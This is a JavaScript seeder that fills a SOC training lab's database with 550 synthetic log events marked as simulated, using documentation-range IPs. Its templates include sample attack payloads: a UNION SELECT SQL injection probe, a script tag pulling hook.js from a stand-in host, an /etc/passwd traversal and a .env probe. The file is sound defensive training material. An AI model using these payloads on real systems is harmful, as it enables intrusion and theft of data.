/**
 * BLITZ Cyber Threats & IOC Investigation Lab - Synthetic Baseline Event Seeder
 * Generates 550+ realistic enterprise SOC training events in documentation IP ranges
 * Clearly labeled as is_simulated: 1 (SIMULATED TRAINING DATA)
 */

import { db } from './database.js';

export function seedSyntheticEvents() {
  const countStmt = db.prepare('SELECT COUNT(*) as count FROM events WHERE is_simulated = 1');
  const { count } = countStmt.get();

  if (count >= 500) {
    return; // Already seeded
  }

  console.log(`[Seed] Generating 550 synthetic background events...`);

  const now = Date.now();
  const insertStmt = db.prepare(`
    INSERT INTO events (
      id, session_id, timestamp, source_ip, event_type, attack_category,
      severity, endpoint, method, user_agent, description, ioc_indicators,
      is_simulated, investigation_flag, payload_details
    ) VALUES (?, NULL, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, NULL, ?)
  `);

  // Documented RFC 5737 Test IP Pools
  const ipPool192 = [
    '192.0.2.14', '192.0.2.45', '192.0.2.89', '192.0.2.102', '192.0.2.155', '192.0.2.210'
  ];
  const ipPool198 = [
    '198.51.100.22', '198.51.100.44', '198.51.100.77', '198.51.100.103', '198.51.100.188', '198.51.100.240'
  ];
  const ipPool203 = [
    '203.0.113.10', '203.0.113.55', '203.0.113.89', '203.0.113.120', '203.0.113.175', '203.0.113.230'
  ];
  const internalIps = [
    '10.0.1.15', '10.0.2.40', '10.0.4.88', '10.0.8.102', '192.168.1.105'
  ];

  const allExternalIps = [...ipPool192, ...ipPool198, ...ipPool203];

  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
    'sqlmap/1.7.2#stable (https://sqlmap.org)',
    'Nikto/2.1.6',
    'Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)',
    'curl/7.88.1',
    'python-requests/2.31.0',
    'Go-http-client/1.1'
  ];

  const eventTemplates = [
    // 1. Failed authentication
    {
      type: 'Failed Authentication',
      category: 'auth',
      severity: 'LOW',
      endpoint: '/api/v1/auth/login',
      method: 'POST',
      desc: 'Single failed login attempt with invalid password credentials.',
      ioc: 'status:401, error:invalid_credentials',
      payload: '{"username":"finance_analyst","attempt":1}'
    },
    // 2. Successful authentication
    {
      type: 'Successful User Login',
      category: 'auth',
      severity: 'INFO',
      endpoint: '/api/v1/auth/login',
      method: 'POST',
      desc: 'Corporate user authenticated successfully via SSO gateway.',
      ioc: 'status:200, session_created',
      payload: '{"username":"dev_lead","auth_method":"MFA"}'
    },
    // 3. Brute force burst
    {
      type: 'Brute-Force Authentication Attempt',
      category: 'brute_force',
      severity: 'HIGH',
      endpoint: '/api/v1/auth/login',
      method: 'POST',
      desc: 'High-frequency credential stuffing detected targeting account sarah_admin (>15 failures in 30s).',
      ioc: 'status:401, threshold_exceeded, burst_rate:0.5s',
      payload: '{"target":"sarah_admin","dictionary":"rockyou_top100"}'
    },
    // 4. SQLi probe
    {
      type: 'SQL Injection Reconnaissance',
      category: 'sqli',
      severity: 'HIGH',
      endpoint: '/api/v1/catalog/items',
      method: 'GET',
      desc: 'Automated SQL injection probe with UNION SELECT and information_schema enumeration.',
      ioc: 'pattern:UNION+SELECT, table:information_schema.tables',
      payload: '{"query":"id=1 UNION SELECT null,table_name,null FROM information_schema.tables"}'
    },
    // 5. XSS probe
    {
      type: 'Cross-Site Scripting Injection',
      category: 'xss',
      severity: 'MEDIUM',
      endpoint: '/api/v1/forum/comments',
      method: 'POST',
      desc: 'HTML script tag injection detected in comment author parameter.',
      ioc: 'tag:<script>, encoded:%3Cscript%3E, attribute:onerror',
      payload: '{"comment":"<script src=\\"http://198.51.100.44/hook.js\\"></script>"}'
    },
    // 6. Directory Traversal
    {
      type: 'Directory Traversal Attempt',
      category: 'path_traversal',
      severity: 'HIGH',
      endpoint: '/api/v1/download/document',
      method: 'GET',
      desc: 'Dot-dot-slash sequence detected attempting to escape document root to read /etc/passwd.',
      ioc: 'pattern:../../../../etc/passwd, null_byte:%00',
      payload: '{"file":"../../../../etc/passwd"}'
    },
    // 7. Suspicious HTTP Request
    {
      type: 'Suspicious HTTP Request',
      category: 'recon',
      severity: 'MEDIUM',
      endpoint: '/.env',
      method: 'GET',
      desc: 'Scanning probe attempting to access sensitive environment variable file (.env).',
      ioc: 'file:.env, sensitive_file_probe',
      payload: '{"target":"/.env"}'
    },
    // 8. Port Scanning / Web Recon
    {
      type: 'Vulnerability Scanner Probe',
      category: 'recon',
      severity: 'MEDIUM',
      endpoint: '/wp-login.php',
      method: 'GET',
      desc: 'Generic CMS endpoint probing by automated web crawler.',
      ioc: 'path:/wp-login.php, 404_not_found',
      payload: '{"target":"/wp-login.php"}'
    },
    // 9. Unauthorized Object Access Probe
    {
      type: 'Unauthorized Resource Access',
      category: 'idor',
      severity: 'HIGH',
      endpoint: '/api/v1/billing/invoices/9410',
      method: 'GET',
      desc: 'Attempt to access customer invoice 9410 belonging to another tenant.',
      ioc: 'tenant_mismatch, object_level_auth_failure',
      payload: '{"requested_invoice_id":9410,"user_tenant":"TENANT-A"}'
    },
    // 10. Privilege Escalation
    {
      type: 'Privilege Escalation Indicator',
      category: 'auth',
      severity: 'CRITICAL',
      endpoint: '/api/v1/admin/roles/grant',
      method: 'POST',
      desc: 'Non-privileged token attempted to call administrative role assignment endpoint.',
      ioc: 'missing_scope:admin.write, status:403',
      payload: '{"role":"global_admin","target_user":"intern_1"}'
    },
    // 11. DNS Anomaly / Outbound Beacon
    {
      type: 'Suspicious External Beaconing',
      category: 'malware',
      severity: 'HIGH',
      endpoint: '/healthcheck',
      method: 'GET',
      desc: 'Host initiated repeated DNS requests to newly registered suspicious domain.',
      ioc: 'domain:c2-beacon.darkops.test, interval:60s',
      payload: '{"dns_query":"c2-beacon.darkops.test"}'
    },
    // 12. Normal Application Activity
    {
      type: 'API Gateway Request',
      category: 'normal',
      severity: 'LOW',
      endpoint: '/api/v1/dashboard/metrics',
      method: 'GET',
      desc: 'Routine polling request from internal management console.',
      ioc: 'status:200, response_time:14ms',
      payload: '{"metrics":["cpu","memory","disk"]}'
    },
    {
      type: 'Asset Inventory Search',
      category: 'normal',
      severity: 'LOW',
      endpoint: '/api/v1/assets/search',
      method: 'GET',
      desc: 'Legitimate corporate asset directory search for active subnet routers.',
      ioc: 'status:200, results:12',
      payload: '{"search":"router_edge"}'
    }
  ];

  // Generate 550 events distributed across the last 3 days
  const totalToSeed = 550;
  for (let i = 0; i < totalToSeed; i++) {
    const template = eventTemplates[i % eventTemplates.length];
    
    // Distribute timestamps back from now up to 72 hours
    const ageSeconds = Math.floor(Math.random() * (72 * 3600));
    const timestamp = new Date(now - (ageSeconds * 1000)).toISOString();
    
    const isNormal = template.category === 'normal';
    const sourceIp = isNormal
      ? internalIps[Math.floor(Math.random() * internalIps.length)]
      : allExternalIps[Math.floor(Math.random() * allExternalIps.length)];

    const userAgent = isNormal
      ? userAgents[0]
      : userAgents[Math.floor(Math.random() * userAgents.length)];

    const id = `SIM-LOG-${String(i + 1).padStart(4, '0')}`;

    insertStmt.run(
      id,
      timestamp,
      sourceIp,
      template.type,
      template.category,
      template.severity,
      template.endpoint,
      template.method,
      userAgent,
      template.desc,
      template.ioc,
      template.payload
    );
  }

  console.log(`[Seed] Successfully seeded 550 synthetic background events.`);
}
